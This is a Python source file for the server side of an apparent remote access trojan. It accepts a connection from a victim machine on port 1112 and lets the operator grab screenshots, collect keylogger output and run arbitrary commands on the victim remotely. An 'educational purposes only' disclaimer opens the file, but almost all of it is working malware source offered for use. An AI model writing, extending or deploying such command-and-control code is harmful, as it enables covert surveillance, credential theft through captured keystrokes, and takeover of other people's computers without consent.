'''
Disclaimer: This code and software are provided for educational purposes only. The author and contributors disclaim any responsibility for misuse, harm, or damage caused by the use of this code. Use at your own risk and responsibility. This code should not be used for any malicious or unauthorized activities.
'''

import socket
from PIL import Image
import io
import os
from datetime import datetime

def take_screenshot(client_socket, client_address):
    folder_name = f"{client_address[0]}_screenshots"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    size_data = client_socket.recv(10).decode('utf-8')
    size = int(size_data)
    print(f"Receiving screenshot data of size: {size}")

    received_data = b""
    while len(received_data) < size:
        data = client_socket.recv(size - len(received_data))
        if not data:
            break
        received_data += data

    if len(received_data) == size:
        print("Screenshot data received successfully.")
        try:
            now = datetime.now()
            timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
            file_name = f"{folder_name}/screenshot_{timestamp}.png"
            img = Image.open(io.BytesIO(received_data))
            img.save(file_name)
            print(f"Screenshot saved successfully to {file_name}.")
        except Exception as e:
            print(f"Failed to save screenshot - {e}")
    else:
        print("Failed to receive complete screenshot data.")

def save_keylogs(client_socket, client_address):
    folder_name = f"{client_address[0]}_keylogs"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"{folder_name}/keylogs_{timestamp}.txt"

    size_data = client_socket.recv(10).decode('utf-8')
    size = int(size_data)
    print(f"Receiving key logs data of size: {size}")

    received_data = b""
    while len(received_data) < size:
        data = client_socket.recv(size - len(received_data))
        if not data:
            break
        received_data += data

    if len(received_data) == size:
        print("Key logs data received successfully.")
        try:
            with open(file_name, "wb") as f:
                f.write(received_data)
            print(f"Key logs saved successfully to {file_name}.")
        except Exception as e:
            print(f"Failed to save key logs - {e}")
    else:
        print("Failed to receive complete key logs data.")

def execute_command(client_socket, client_address):
    try:
        command = input("Enter the command to execute on the client: ")
        client_socket.sendall(b"cmd")
        client_socket.sendall(bytes(command, 'utf-8'))
        output = client_socket.recv(4096).decode('utf-8')
        print(f"Output from client: {output}")
    except Exception as e:
        print(f"Error occurred - {e}")

def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print('Waiting For Connection...')
    (client_socket, client_address) = server_socket.accept()
    print('Connected to: ', client_address[0])

    try:
        while True:
            command = input("Enter a command ('screenshot [ip]', 'cmd [ip]', 'logs [ip]', 'exit'): ")

            if command.startswith("screenshot"):
                try:
                    _, ip = command.split()
                    if ip == client_address[0]:
                        client_socket.sendall(b"screenshot")
                        take_screenshot(client_socket, client_address)
                    else:
                        print(f"Client with IP {ip} not found.")
                except ValueError:
                    print("Please enter an IP address after 'screenshot' command.")
            elif command.startswith("cmd"):
                try:
                    _, ip = command.split()
                    if ip == client_address[0]:
                        execute_command(client_socket, client_address)
                    else:
                        print(f"Client with IP {ip} not found.")
                except ValueError:
                    print("Please enter an IP address after 'cmd' command.")
            elif command.startswith("logs"):
                try:
                    _, ip = command.split()
                    if ip == client_address[0]:
                        client_socket.sendall(b"logs")
                        save_keylogs(client_socket, client_address)
                    else:
                        print(f"Client with IP {ip} not found.")
                except ValueError:
                    print("Please enter an IP address after 'logs' command.")

            elif command == "exit":
                break
            else:
                print("Invalid command.")

    except Exception as e:
        print(f"Error occurred - {e}")

    print("Connection closed.")
    client_socket.close()

if __name__ == "__main__":
    host = '0.0.0.0'  # Listen on all available network interfaces
    port = 1112       # Use the same port number as the client
    start_server(host, port)
